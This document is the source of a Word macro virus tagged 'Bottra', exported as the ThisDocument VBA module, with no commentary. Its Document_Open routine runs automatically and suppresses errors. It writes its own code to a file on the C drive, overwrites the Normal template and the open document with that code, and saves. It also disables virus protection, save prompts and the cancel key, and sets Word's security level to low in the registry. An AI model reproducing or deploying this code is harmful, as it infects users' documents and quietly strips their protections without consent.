   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   'Bottra
   Private Sub Document_Open()
       On Error Resume Next
       Dim ThisDoc, NTmp As Object
       Dim MyCode As String
       Set ThisDoc = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
       Set NTmp = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
       Set ADoc = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule

       TCode = NTmp.CountOfLines
       ACode = ADoc.CountOfLines

       MyCode = ThisDoc.Lines(1, ThisDoc.CountOfLines)
       Open "c:\tk.mxc" For Output As #1
           Print #1, "Attribute VB_Name=""ThisDocument"""
           Print #1, MyCode
       Close #1

       NTmp.DeleteLines 1, TCode
       NTmp.AddFromFile "c:\tk.mxc"

       ADoc.DeleteLines 1, ACode
       ADoc.AddFromFile "c:\tk.mxc"

       ActiveDocument.Saved = False
       If ActiveDocument.Saved = False Then ActiveDocument.Save

       ShowVisualBasicEditor = False 'CommandBars("Tools").Controls("Macro").Enabled = False
       Application.EnableCancelKey = wdCancelDisabled
       With Options: .SaveNormalPrompt = False: .VirusProtection = False: .SavePropertiesPrompt = False: End With
       System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\9.0\Word\Security", "Level") = 1
   End Sub
